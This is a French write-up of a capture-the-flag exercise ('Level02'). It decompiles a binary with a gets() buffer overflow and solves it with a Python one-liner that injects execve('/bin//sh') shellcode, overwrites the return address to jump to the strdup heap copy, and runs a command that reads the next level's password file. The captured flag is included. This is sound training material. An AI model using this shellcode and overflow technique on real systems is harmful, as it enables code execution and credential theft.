# Rapport CTF - [Level02]

### Observation :
En arrivant sur le level2 on trouve un exécutable nommé level2.\
Quand nous essayons de le lancer avec un argument le programme nous renvois juste notre propre chaîne de caractère puis se ferme. \
Regardons donc avec gdb ou un decompilateur.


### Explication de Code :
En lançant le binaire dans hex-ray ou ghidra nous obtenons :
```c
//----- (080484D4) --------------------------------------------------------
char *p()
{
char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
const void *v2; // [esp+5Ch] [ebp-Ch]
unsigned int retaddr; // [esp+6Ch] [ebp+4h]

fflush(stdout);
gets(s);
v2 = (const void *)retaddr;
if ( (retaddr & 0xB0000000) == 0xB0000000 )
{
printf("(%p)\n", v2);
_exit(1);
}
puts(s);
return strdup(s);
}

//----- (0804853F) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
return (int)p();
}
```
Nous pouvons voir plusieurs chose :
- Le programme lance la fonction `p()`.
- La fonction `p()` écrits dans un buffer `s[64]` votre string.
- Ensuite la fonction `p()` test si votre adresse de retour est dans la stack, si elle l'est, alors la fonction printf l'adresse de retour puis exit.
- Sinon la fonction print avec `puts()` votre entrée puis renvois l'adresse de la chaîne malloc de strdup.


### Solution :

Nous devons donc injecter un **SHELLCODE** pour pouvoir return sur notre propre code et l'exécuter. \
On crée donc un **shellcode** et on le met au début de notre chaîne pour qu'il soit exécuté. \ 
Nous voulons écrire l'adresse de notre shellcode a `(s) + (void*)` = `64 + 16` octets. \
On écrit donc notre **shellcode** au début (24 octets) ensuite des octets random pour arriver a (64  + 16 - 24), ensuite nous pouvons écrire notre adresse de retour.

On fait la commande suivante pour obtenir le flag :
```sh
(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + '\x00' * (64 + 16 - 24) + '\x08\x04\xa0\x08'[::-1])" ; echo "cat /home/user/level3/.pass") | ./level2
```

### Resultat :
```sh
j
X1�Vh//shh/bin��1ɉ�̀
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```